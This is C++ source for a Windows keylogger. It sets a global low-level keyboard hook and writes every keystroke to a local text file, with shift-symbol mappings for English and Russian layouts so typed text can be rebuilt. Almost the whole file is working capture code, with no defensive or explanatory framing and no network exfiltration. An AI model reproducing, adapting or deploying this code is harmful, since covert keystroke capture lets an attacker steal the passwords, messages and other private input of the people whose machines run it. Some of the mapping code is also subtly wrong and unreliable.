#include "../../Include/KeyLogger/KeyLogger.h"

key_logger::key_logger()
{ hooke_type = WH_KEYBOARD_LL; }

key_logger::~key_logger()
{ UnhookWindowsHookEx( hHooK ); }

key_logger::key_logger( int ihook_ )
{ hooke_type = ihook_; }

void key_logger::set_hook()
{
    if( ( hHooK = SetWindowsHookEx( hooke_type, log_key , NULL, 0 ) ) == NULL )
    {
        error_log audit( "log/audit.txt" );
        std::cout << "SetWindowsHookEx: " << GetLastError()
                  << " time: "
                  << audit.to_time_t()
                  << std::endl;
        exit( 0 );
    }
    
}

bool is_upper_case()
{
    if( ( GetKeyState( VK_CAPITAL ) & 0x0001 ) != 0 ^
        ( GetKeyState( VK_SHIFT ) & 0x8000 ) != 0 )
        return ( true );
    
    return ( false );
}

LRESULT CALLBACK key_logger::log_key( int icode, WPARAM w_param, LPARAM l_param )
{
    write_file write( "../log/keylogger_custom.txt" );
    // User pressed the button
    if( w_param == WM_KEYDOWN )
    {
        /**
         * Save pressed button info in struct
         * KBDLLHOOKSTRUCT contains info about low-level keyboard input event
         */
        PKBDLLHOOKSTRUCT kbd = ( PKBDLLHOOKSTRUCT )( l_param );
        DWORD key_ix = MapVirtualKey( kbd->vkCode, 0 ) << 16;

        /**
         * kdb.vkCode must be in range 1 to 254
         */
        if( !( kbd->vkCode <= ( 1 << 5 ) ) )
        {
            key_ix |= ( 0x1 << 24 ); // Extended-key flag. Distinguishes some keys on an enhanced keyboard.
        }

        std::wstring key_name{ buf_size + 1 };
        GetKeyNameTextW( key_ix, &key_name[0], buf_size );
        std::wcout << key_name.data() << std::endl;

        /**
         * Different keys have different size
         */

        if( wcslen( key_name.c_str() ) > 1 )
        { 
            write.write( key_name.data() ); 
        }
        
        else
        {
            if( is_upper_case() == true )
            {
                switch (key_name[0])
                {
                    case '1': { write.write(L"!"); break; }
                    case '2':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"@");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"\"");
                            break;
                        }
                    case '3':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"#");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"№");
                            break;
                        }
                    case '4':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"$");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L";");
                            break;
                        }
                    case '5': { write.write(L"%"); break; }
                    case '6':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"^");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L":");
                            break;
                        }
                    case '7':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"&");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"?");
                            break;
                        }
                    case '8': { write.write(L"*"); break; }
                    case '9': { write.write(L"("); break; }
                    case '0': { write.write(L")"); break; }
                    case '-': { write.write(L"_"); break; }
                    case '=': { write.write(L"+"); break; }
                    case '[':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"{");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Х");
                            break;
                        }
                    case ']':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"}");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Ъ");
                            break;
                        }
                    case ';':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L":");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Ж");
                            break;
                        }
                    case '\'':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"\"");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Ж");
                            break;
                        }
                    case ',':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"<");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Б");
                            break;
                        }
                    case '.':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L">");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Ю");
                            break;
                        }
                    case '/':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"?");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L",");
                            break;
                        }
                    case '\\':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"|");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"/");
                            break;
                        }
                    case '`':
                        {
                            if ( LOWORD( GetKeyboardLayout( 0 ) ) == English )
                                write.write(L"~");
                            else if ( LOWORD( GetKeyboardLayout( 0 ) ) == Russian )
                                write.write(L"Ё");
                            break;
                        }
                    default: { write.write( key_name.data() ); break; }
                }
            }
            else
            {
                key_name[0] = std::tolower( key_name[0] );
                write.write( key_name.data() );
            }
        }
    }

    return CallNextHookEx( NULL, icode, w_param, l_param );
}